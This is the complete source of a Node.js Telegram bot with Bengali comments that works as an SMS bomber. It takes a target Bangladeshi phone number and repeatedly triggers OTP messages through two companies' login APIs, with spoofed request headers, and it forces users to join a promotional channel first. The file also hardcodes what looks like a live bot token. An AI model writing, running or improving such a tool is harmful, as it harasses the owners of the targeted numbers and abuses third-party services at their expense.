const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const channelId = '@srmtelecom'; // আপনার চ্যানেলের ইউজারনেম (@ সহ)
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Render সচল রাখতে সার্ভার
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Force-Join Active!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Force Join Mode) চালু হয়েছে...");

// প্রধান মেনু
const mainMenu = {
    reply_markup: {
        keyboard: [[{ text: '🚀 শুরু করুন (Attack)' }], [{ text: '📢 চ্যানেল জয়েন' }]],
        resize_keyboard: true
    }
};

// চ্যানেল জয়েন চেক করার ফাংশন
async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    // ১. ফোর্স জয়েন চেক (সব কম্যান্ডের জন্য)
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start') {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nবটটি ব্যবহার করতে আমাদের অফিশিয়াল চ্যানেলে জয়েন থাকা বাধ্যতামূলক।\n\n📢 লিংক: ${channelLink}\n\nজয়েন করে আবার /start দিন।`, { parse_mode: "Markdown" });
    }

    // ২. মেনু হ্যান্ডলার
    if (text === '/start') {
        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM**\nস্বাগতম! নিচে বাটন চেপে কাজ শুরু করুন।", mainMenu);
    }

    else if (text === '🚀 শুরু করুন (Attack)') {
        userStates[chatId] = { step: 'num' };
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    else if (text === '📢 চ্যানেল জয়েন') {
        bot.sendMessage(chatId, `আমাদের অফিশিয়াল চ্যানেল: ${channelLink}`);
    }

    // ৩. ওটিপি প্রসেস (Dual API)
    else if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS লুপ পাঠাতে চান? (১-৫০)**`);
        } else { bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন।"); }
    } 

    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 50) return bot.sendMessage(chatId, "⚠️ ১-৫০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে ডাবল পাওয়ার অ্যাটাক শুরু...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            // API 1: Iqra GET
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`, { timeout: 3000 }); success++; } catch (e) {}
            // API 2: BdTickets POST
            try { 
                await axios.post('https://api.bdtickets.com:20100/v1/auth', { createUserCheck: true, phoneNumber: "+88" + target, applicationChannel: "WEB_APP" }, 
                { headers: { 'Content-Type': 'application/json', 'Origin': 'https://bdtickets.com', 'Sec-Ch-Ua-Platform': '"Android"' }, timeout: 3000 }); 
                success++; 
            } catch (e) {}

            await new Promise(r => setTimeout(r, 2000));
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল হিট: ${success}টি`, mainMenu);
    }
});
